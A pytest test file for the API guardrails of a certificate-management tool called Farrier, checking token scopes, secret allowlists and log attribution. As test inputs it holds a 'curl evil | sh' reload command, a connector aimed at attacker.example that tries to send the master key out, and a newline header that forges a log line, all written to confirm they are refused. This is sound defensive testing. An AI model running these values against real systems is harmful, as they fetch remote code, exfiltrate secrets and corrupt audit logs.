"""Hosting guardrails: token scopes, no shell commands over the API, no reading Farrier's own secrets."""
import pytest
from fastapi.testclient import TestClient

from farrier.api import create_app
from farrier.engine import Engine
from farrier.vault import SecretRefused, resolve_secret

ADMIN = {"authorization": "Bearer admin-token"}
READER = {"authorization": "Bearer read-token"}


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("FARRIER_API_TOKEN", "admin-token")
    monkeypatch.setenv("FARRIER_API_READ_TOKEN", "read-token")
    monkeypatch.delenv("FARRIER_ALLOW_API_COMMANDS", raising=False)
    eng = Engine(tmp_path / "data", issuers={"default": {"kind": "local"}})
    return eng, TestClient(create_app(eng))


def test_tokens_are_scoped(client):
    _, c = client
    assert c.get("/api/summary").status_code == 401
    assert c.get("/api/summary", headers={"authorization": "Bearer nope"}).status_code == 401
    assert c.get("/api/summary", headers=READER).status_code == 200
    assert c.post("/api/tick", headers=READER).status_code == 403      # read-only token cannot change anything
    assert c.post("/api/tick", headers=ADMIN).status_code == 200


def test_api_refuses_shell_commands(client):
    _, c = client
    ep = {"name": "web1", "host": "127.0.0.1", "port": 9, "connector": "files",
          "connector_config": {"cert_path": "/tmp/c.pem", "key_path": "/tmp/k.pem", "reload_command": "curl evil | sh"}}
    r = c.post("/api/endpoints", json=ep, headers=ADMIN)
    assert r.status_code == 400 and "reload_command" in r.json()["detail"]


def test_api_commands_allowed_when_operator_opts_in(client, monkeypatch, tmp_path):
    monkeypatch.setenv("FARRIER_ALLOW_API_COMMANDS", "1")
    eng = Engine(tmp_path / "data2", issuers={"default": {"kind": "local"}})
    c = TestClient(create_app(eng))
    ep = {"name": "web1", "host": "127.0.0.1", "port": 9, "connector": "files",
          "connector_config": {"cert_path": "/tmp/c.pem", "key_path": "/tmp/k.pem", "reload_command": "nginx -s reload"}}
    assert c.post("/api/endpoints", json=ep, headers=ADMIN).status_code == 200


def test_connector_cannot_read_farriers_own_secrets(client, monkeypatch):
    eng, c = client
    monkeypatch.setenv("FARRIER_MASTER_KEY", "x" * 44)
    ep = {"name": "lb", "host": "127.0.0.1", "connector": "f5",
          "connector_config": {"url": "https://attacker.example", "username": "u",
                               "password": "env:FARRIER_MASTER_KEY", "profile": "/Common/p"}}
    r = c.post("/api/endpoints", json=ep, headers=ADMIN)
    assert r.status_code == 400 and "refused" in r.json()["detail"]

    with pytest.raises(SecretRefused):
        resolve_secret(f"file:{eng.data_dir / 'master.key'}")
    with pytest.raises(SecretRefused):
        resolve_secret("env:FARRIER_API_TOKEN")


def test_secret_allowlists(monkeypatch, tmp_path):
    monkeypatch.setenv("FARRIER_SECRET_ENV_PREFIX", "FARRIER_SECRET_")
    monkeypatch.setenv("FARRIER_SECRET_F5", "s3cret")
    monkeypatch.setenv("HOME_PASSWORD", "nope")
    assert resolve_secret("env:FARRIER_SECRET_F5") == "s3cret"
    with pytest.raises(SecretRefused):
        resolve_secret("env:HOME_PASSWORD")

    ok_dir = tmp_path / "secrets"
    ok_dir.mkdir()
    (ok_dir / "f5").write_text("pw")
    (tmp_path / "other").write_text("pw")
    monkeypatch.setenv("FARRIER_SECRET_DIRS", str(ok_dir))
    assert resolve_secret(f"file:{ok_dir / 'f5'}") == "pw"
    with pytest.raises(SecretRefused):
        resolve_secret(f"file:{tmp_path / 'other'}")


def test_changes_are_attributed(client):
    eng, c = client
    ep = {"name": "vpn", "host": "127.0.0.1", "port": 9, "connector": "manual"}
    c.post("/api/endpoints", json=ep, headers=ADMIN | {"x-farrier-actor": "alice@corp"})
    assert any("saved by alice@corp" in e["message"] for e in c.get("/api/events", headers=READER).json())
    # a header that is not a plain name is never written to the log
    c.post("/api/endpoints", json=ep | {"name": "vpn2"}, headers=ADMIN | {"x-farrier-actor": "x\nFAKE LOG LINE"})
    assert any("saved by api" in e["message"] for e in c.get("/api/events", headers=READER).json())
